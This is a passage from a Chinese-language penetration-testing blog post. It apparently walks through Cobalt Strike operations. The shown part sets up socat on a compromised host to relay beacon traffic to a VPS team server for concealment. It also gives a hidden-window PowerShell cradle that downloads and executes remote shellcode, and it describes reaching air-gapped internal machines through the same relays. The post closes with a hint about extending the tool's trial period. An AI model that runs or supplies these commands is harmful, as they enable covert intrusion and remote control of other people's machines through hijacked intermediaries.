+<p>首先,到kali中用cs客户端登到我们的团队服务器,创建一个正常80端口的监听器,这里的回连ip暂时直接用vps所在的真实ip[实际中尽量用域名,很重要],如下<br><img src="/img/socat_listener.png" alt="&#39;&#39;"><br><img src="/img/socat_listener_dns.png" alt="&#39;&#39;"><br></p>
+<p>接着,就可以ssh到肉鸡上用socat开始做转发了,下面这句话的意思就是将来自外部的80端口上的流量转到公网vps的80端口上,之后肉鸡本地的80端口会一直处于监听状态,只要80端口一有流量经过就会自动转发到vps的80端口,而vps的80端口又正好是我们的监听器端口,这意思,相信你懂的<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">socat</span> <span class="selector-tag">tcp-listen</span><span class="selector-pseudo">:80</span>,<span class="selector-tag">reuseaddr</span>,<span class="selector-tag">fork</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:53.3.3.6</span><span class="selector-pseudo">:80</span> &amp;</div></pre></td></tr></table></figure></p>
+<p><img src="/img/socat_listener_rouji.png" alt="&#39;&#39;"><br></p>
+<p>此时,回到cs客户端随便创建一个powershell payload,注意,正如我们前面所说,这只是个powershell下载器,主要负责下载真正的shellcode代码,一定要记得把后面的ip要改成肉鸡的ip[因为我这里是模拟的肉鸡,所以才是个内网ip,实际中肯定是个公网ip或者域名],因为我们最终的目的是通过肉鸡帮我们转发到我们真正的团队服务器上去,以此来达到尽量隐藏的目的</p>
+<p>注意这里,默认生成以后,它是我们自己团队服务器解析的那个域名,实际中一定要手动把它改成肉鸡的域名或ip,这样,当下载访问肯定首先会访问到肉鸡,而我们已经在肉鸡做了转发,所以最终还是会达到我们的团队服务器成功下载到shellcode代码,我个废物,竟然连码都没打全,算了,反正vps马上也快到期了,打游击打习惯了,嘿嘿……^_^<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http:<span class="comment">//192.168.1.100:80/a'))"</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/socat_listener_payload.png" alt="&#39;&#39;"><br><img src="/img/socat_listener_payload_res.png" alt="&#39;&#39;"><br><img src="/img/socat_listener_payload_res_target.png" alt="&#39;&#39;"><br><img src="/img/socat_listener_payload_res_target_upload.png" alt="&#39;&#39;"><br></p>
+<p>最后,我们看到目标正常上线,至于,怎么让目标内网中不能正常连网的机器也能正常上线都是一模一样的道理,你可以把payload回连的流量弹到内网中任何一台可以正常上网的机器上,然后再去那台机器上把弹过来的流量转到我们团队服务器上,这样即可达到让内网中不能上网的机器也一样正常上线</p>
+<p>0x10 深入理解dns隧道通信以及smb beacon通信过程,这可能是整个工具最核心的地方之一,后续会用大量的篇幅单独说</p>
+<p>0x11 至于牛逼的报告生成功能这里就不说了吧,支持一键导出pdf,实际渗透过程中的所有操作记录数据全部都被保存在指定的目录中,大家有兴趣可自行研究,比较简单,毕竟不是我们这里的重点,就不多啰嗦了<br><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;大家也看到了,关于工具本身使用非常简单,纯图形化操作,稍微有点儿基础,很快就能上手,而且它直接支持图标灵活拖拽,很方便对指定肉鸡进行集中批量操作,非常友好,实际中将msf和cs配合起来进行内网渗透,无疑暂时也是极好的,真正的难点还在于对不同协议的beacon shell通信过程的理解,这也是个人觉得整个工具最值钱的地方,说实话,关于其内部的通信细节很多问题至今仍困扰着我,一直都觉得cs本身就是一款非常完美的学习样本,里面有太多值得深挖沉淀的东西,只是苦于有很多东西,并非一个人所能完成,相信也大家跟我一样,绝不会仅仅满足于工具基本使用上,其实心里都很清楚,那样基本是不会有什么实质性的长进的,时间不多,容不得浪费,所以也非常期待跟大家一起深入交流……对了,cs 3.8也已经出来了一段时间了,想尝鲜的朋友可以去试试,延长试用期还是老办法…</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/cobalt-strike/">#cobalt strike</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
